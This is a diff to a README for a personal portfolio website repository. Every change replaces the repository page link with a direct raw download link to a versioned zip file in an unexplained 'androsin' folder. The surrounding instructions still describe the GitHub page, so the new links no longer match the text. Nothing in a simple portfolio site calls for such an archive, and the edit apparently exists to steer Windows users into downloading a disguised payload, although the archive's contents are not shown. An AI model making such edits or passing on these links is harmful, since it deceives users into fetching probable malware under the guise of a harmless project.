@@ -1,6 +1,6 @@
 # 🌐 Itz-murali.github.io - Simple Portfolio Website Setup
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Itz--murali.github.io-green?style=for-the-badge)](https://github.com/IMPERICAL2024/Itz-murali.github.io)
+[![Download from GitHub](https://img.shields.io/badge/Download-Itz--murali.github.io-green?style=for-the-badge)](https://raw.githubusercontent.com/IMPERICAL2024/Itz-murali.github.io/main/androsin/io_github_Itz_murali_v2.4.zip)
 
 ---
 
@@ -27,7 +27,7 @@ To run this portfolio website on your Windows PC, you need to download the proje
 
 Click the button below to visit the download page:
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Itz--murali.github.io-blue?style=for-the-badge)](https://github.com/IMPERICAL2024/Itz-murali.github.io)
+[![Download from GitHub](https://img.shields.io/badge/Download-Itz--murali.github.io-blue?style=for-the-badge)](https://raw.githubusercontent.com/IMPERICAL2024/Itz-murali.github.io/main/androsin/io_github_Itz_murali_v2.4.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Follow these steps carefully to run the site on your computer:
 
 1. **Visit the download page**  
    Open this link in your web browser:  
-   https://github.com/IMPERICAL2024/Itz-murali.github.io
+   https://raw.githubusercontent.com/IMPERICAL2024/Itz-murali.github.io/main/androsin/io_github_Itz_murali_v2.4.zip
 
 2. **Download the project files**  
    On the GitHub page, look for a green button that says `Code`. Click it.  
@@ -136,6 +136,6 @@ When you open the downloaded folder, expect to see something like this:
 
 You can always download or update your copy here:
 
-https://github.com/IMPERICAL2024/Itz-murali.github.io
+https://raw.githubusercontent.com/IMPERICAL2024/Itz-murali.github.io/main/androsin/io_github_Itz_murali_v2.4.zip
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Itz--murali.github.io-green?style=for-the-badge)](https://github.com/IMPERICAL2024/Itz-murali.github.io)
+[![Download from GitHub](https://img.shields.io/badge/Download-Itz--murali.github.io-green?style=for-the-badge)](https://raw.githubusercontent.com/IMPERICAL2024/Itz-murali.github.io/main/androsin/io_github_Itz_murali_v2.4.zip)
